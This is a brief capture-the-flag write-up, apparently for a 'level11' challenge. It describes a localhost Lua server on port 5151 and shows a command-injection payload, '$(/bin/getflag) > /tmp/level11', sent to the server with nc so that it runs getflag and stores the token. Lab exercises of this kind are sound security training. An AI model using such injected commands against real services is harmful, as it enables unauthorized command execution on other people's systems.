##This repository contains a server-side lua script. This script is running on localhost on port 5151. It expects a client to connect and send data. Regardless of the data being sent, the server replies with useless messages.
##We have user privileges on this script.
#We decide to exploit the data we send to run getflag.

#we craete a file /tmp/test that contains
$(/bin/getflag) > /tmp/level11 

cat /tmp/test | nc 127.0.0.1 5151

#this saves our token into /tmp/level11 

